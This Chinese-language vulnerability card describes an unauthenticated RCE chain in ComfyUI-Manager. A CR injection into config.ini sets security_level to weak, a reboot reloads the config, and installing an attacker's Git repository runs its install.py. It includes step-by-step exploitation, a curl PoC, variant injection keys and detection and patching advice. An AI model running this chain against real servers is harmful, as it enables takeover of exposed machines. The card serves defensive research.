---
id: web-python-comfyui-manager-crlf-security-level-weaken-install-py-rce
title: ComfyUI-Manager CRLF 注入 security_level=weak + reboot + git_url 安装恶意节点：克隆仓库的 install.py 在安装阶段执行 RCE
type: scenario
domain: web
path: web/python
technique: comfyui-manager-crlf-security-level-weaken-install-py-rce
aliases:
- ComfyUI-Manager RCE 组合拳
- ConfigParser CRLF 注入
- security_level weak 降级
- customnode install git_url install.py
- manager reboot 配置重载
- ComfyUI-Manager 未授权 RCE
tags:
- python
- comfyui
- comfyui-manager
- crlf
- config-injection
- configparser
- security-level-bypass
- git-clone
- install-script
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
affected_versions: ComfyUI-Manager < 3.39.2；< 4.0.5
verification:
  verified_by: verifier-V167
  verified_at: '2026-11-06T13:40:11+08:00'
  notes: 已对照原文全文与14张图核对：write_config 修复清洗 \r\n\x00、/manager/policy/component 调 set_component_policy→write_config、db_mode 注入 %0dsecurity_level=weak（图07/08）、ConfigParser 将 \n 变 \n\t 故必须用 \r、/manager/reboot 的 middle 检查默认 normal 放行（图09/10）、weak 放行 high 的 /api/customnode/install/git_url（图11/12）、gitclone_install→execute_install_script→[sys.executable,'install.py']（图13）、touch /tmp/lufeisec 成功（图14）均一致。与 CVE-2026-22777 CRLF→git_exe 卡、CVE-2025-67303 weak→__init__ 卡均 related 但注入源/执行阶段不同，不构成重复。affected_versions 按原文 '< 3.39.2'、'< 4.0.5' 设置；无 CVE（原文未给）、无 sources/source_url。未验证点：未本机复跑，原文影响说明含 --listen 远程暴露前提。
---

## 一句话结论

ComfyUI-Manager 的配置写入接口未过滤回车符：对 `/manager/db_mode?value=workflow%0dsecurity_level=weak` 发起请求，会利用 ConfigParser 只替换 `\n`、不处理 `\r` 的特性向 `config.ini` 注入一行 `security_level=weak`；随后无需认证调用 `/manager/reboot` 重载配置，`security_level` 降为 `weak`，从而满足 `/api/customnode/install/git_url` 的 high 级权限检查；再让服务端克隆攻击者仓库，仓库根目录的 `install.py` 会被 `[sys.executable, "install.py"]` 直接执行，形成完整 RCE。

## 原理

- **配置写入 sink 未做 CR/LF 清洗**：`manager_core.write_config()` 用 `configparser.ConfigParser(strict=False)` 把 `[default]` 段的各键值写入 `config.ini`。修复前没有对字符串值去除 `\r`、`\n`、`\x00`；官方修复 commit 在写文件前遍历 `config['default']` 并执行 `value.replace('\r','').replace('\n','').replace('\x00','')`。
- **为什么用 `\r` 而不是 `\n`**：`ConfigParser.write()` 的 `_write_section` 会把值中的 `\n` 替换成 `\n\t`（续行缩进），所以 `%0A` 注入的下一行会带缩进、无法成为独立键；而 `\r` 不在替换范围内，会原样写入文件。读取时 Python 文本模式的 universal newlines 把单独的 `\r` 也识别为换行，于是注入值被解析成两行，成功产生新的配置项。
- **重复键覆盖**：`ConfigParser(strict=False)` 允许同一 section 内出现重复键，后读到的值覆盖先前的值。原文选择 `/manager/db_mode` 作为注入入口，把 `security_level=weak` 注入到文件末尾（位于原有 `security_level = normal` 之后），重启读取后生效。
- **入口链路**：`/manager/policy/component` 与 `/manager/db_mode` 等路由都直接读取 `request.rel_url.query['value']`，经 `set_component_policy()` 等写入内存配置，再调用 `core.write_config()` 落盘；入口没有认证、没有字符过滤。
- **重启加载配置**：`/manager/reboot` 用 `is_allowed_security_level('middle')` 判断权限；默认 `security_level=normal` 属于 middle 允许的 `['weak','normal','normal-']`，因此未认证请求即可重启。重启后 `config.ini` 被重新读取，注入的 `security_level=weak` 生效。
- **weak 放行 high 接口**：`is_allowed_security_level('high')` 在非 local 模式下只在 `security_level == 'weak'` 时返回 True（local 模式则接受 `weak`/`normal-`）。降级后 `/api/customnode/install/git_url` 不再返回 403。
- **install.py 执行**：`install_custom_node_git_url` 读取请求体作为 Git URL，调用 `core.gitclone_install(url)` 克隆仓库；随后 `execute_install_script()` 检查仓库根目录是否存在 `install.py`，存在则构造 `install_cmd = [sys.executable, "install.py"]` 并执行。该脚本在“安装节点”阶段就以 ComfyUI 进程权限运行，不需要重启后导入插件，也不依赖 `__init__.py`。
- **为什么是完整 RCE**：攻击者只需控制一个可被目标克隆的 Git 仓库，在根目录放 `install.py`；克隆与安装由服务端主动发起，脚本内容无签名/白名单校验，命令以服务进程权限执行。原文用 `os.system("touch /tmp/lufeisec")` 验证成功。

## 触发条件

- ComfyUI-Manager < 3.39.2，或 4.x < 4.0.5（原文影响版本标记）。
- ComfyUI 对攻击者网络可达（常见 `--listen` 部署，默认 8188），`/manager/*` 与 `/api/customnode/*` 未加额外认证。
- 目标进程对 `user/__manager/config.ini` 有写权限，且 `/manager/reboot` 可触发进程重启并由外部拉起。
- 目标能访问攻击者的 Git 仓库（GitHub 或内网 Git 服务）；若走公网需目标具备出网能力。
- 安装流程未被禁用（`install.py` 存在时默认执行），且服务进程有权限执行目标命令。

## 利用步骤

1. 确认服务可达与版本：访问 ComfyUI 首页/管理接口，按版本或响应确认处于受影响区间。
2. 注入配置：请求 `GET /manager/db_mode?value=workflow%0dsecurity_level=weak`（`%0d` 为 CR；若被过滤可尝试其他注入点或编码）。响应通常为 200/空 body。
3. 验证写入：查看 `ComfyUI/user/__manager/config.ini`，确认末尾出现独立的 `security_level=weak` 行（原 `security_level = normal` 仍在，重复键后者生效）。
4. 重启加载：请求 `GET /manager/reboot`；服务退出并由启动脚本重新拉起，读取到 weak 配置。
5. 准备恶意仓库：在 GitHub/内网 Git 创建仓库，根目录放 `install.py`，内容如 `import os; os.system("touch /tmp/lufeisec")`。
6. 触发安装：`POST /api/customnode/install/git_url`，请求体为仓库 URL；服务端克隆并执行 `install.py`。
7. 验证：检查 `/tmp/lufeisec` 是否生成，或用反弹 shell/DNS 外带确认执行。

## PoC

```bash
BASE="http://127.0.0.1:8188"

# 1) CRLF 注入 security_level=weak（%0d = CR）
curl -i "$BASE/manager/db_mode?value=workflow%0dsecurity_level=weak"

# 2) 查看配置（需本机访问文件系统）
cat ComfyUI/user/__manager/config.ini
# [default]
# ...
# security_level = normal
# ...
# db_mode = workflow
# security_level=weak        <- 注入行

# 3) 重启加载配置
curl -i "$BASE/manager/reboot"

# 4) 安装恶意节点，install.py 被执行
curl -X POST "$BASE/api/customnode/install/git_url" -d 'https://github.com/<attacker>/test_poc'

# 5) 验证
ls -alh /tmp/lufeisec
```

恶意仓库根目录 `install.py`：

```python
import os
os.system("touch /tmp/lufeisec")
```

## 变体与关联

- 变体（其他注入入口）：`/manager/policy/component`、`/manager/preview_method`、`/manager/policy/update` 等同样读取 `value` 并调用 `write_config`，可按可达性替换。
- 变体（注入其他键）：除 `security_level=weak` 外，还可注入 `git_exe` 指向可执行脚本（配合 Git 操作触发）、`channel_url` 指向恶意源、`update_policy` 改变更新分支；不同键受配置迁移/覆盖逻辑影响，成功率不同。
- 变体（分隔符）：优先 `%0D`；`%0A` 会被 writer 改成 `\n\t` 续行，`%0D%0A` 也可能受同样处理，必要时按环境轮试。
- 变体（执行载体）：`install.py` 在安装阶段执行；也可利用 clone 后重启时导入 `__init__.py` 的插件加载链（见关联卡），两条路径可互为备份。
- 关联：[[web-python-comfyui-manager-cve-2026-22777-configparser-crlf-git-exe-rce]]（同一 ConfigParser CRLF 修复 commit，但该卡走 `git_exe` 劫持 + `update_comfyui`；本卡走 `security_level` 降级 + 安装脚本）、[[web-python-comfyui-manager-weak-config-git-clone-reboot-rce]]（CVE-2025-67303，用 `/api/userdata` 上传 config.ini 得到 weak，再靠重启导入 `__init__.py`；本卡用 CRLF 注入得到 weak，且 `install.py` 在安装阶段执行）、[[web-python-deserialization-comfyui-loadtrainingdataset-torch-load-pickle-rce]]（ComfyUI 另一条 RCE 链）。
- 边界：修复版本会清洗 CR/LF/NUL；`security_level` 可能被配置迁移逻辑覆盖（原文环境未发生）；目标不能出网且无内网 Git 时无法克隆；`install.py` 执行可能受部署脚本/权限限制。

## 检测与防御

- 检测请求：`/manager/db_mode`、`/manager/policy/*`、`/manager/preview_method` 等接口的 `value` 参数中出现 `%0D`、`%0A`、`\r`、`\n` 或 `security_level`、`git_exe`、`channel_url` 等键名；短时间内在注入后紧跟 `/manager/reboot` 与 `/api/customnode/install/git_url` 的请求序列。
- 检测文件：`config.ini` 出现重复的 `security_level`、出现指向 `custom_nodes/`、`/tmp`、`/proc/self/cwd` 的 `git_exe`，或异常的 `channel_url`；文件内容出现裸 `\r`。
- 检测进程：ComfyUI 进程派生 `python install.py`、`sh`、`bash`、`curl` 等子进程；`custom_nodes/` 新增陌生仓库目录及 `install.py`/`__init__.py`。
- 修复：升级到 ComfyUI-Manager 3.39.2、4.0.5 或更高；在 `write_config` 写盘前清洗 `\r`、`\n`、`\x00`；对所有 `value` 参数做白名单/长度限制。
- 加固：不要用 `--listen` 把 ComfyUI-Manager 暴露到公网；管理接口加认证与反向代理访问控制；`git_url` 安装来源做白名单/签名校验；限制 `custom_nodes` 写入与脚本执行权限。
- 响应：发现注入后清理 `config.ini`、检查 `custom_nodes` 与进程树、审计 `/manager/*` 与 `/api/customnode/*` 日志、轮换可能泄露的凭据。
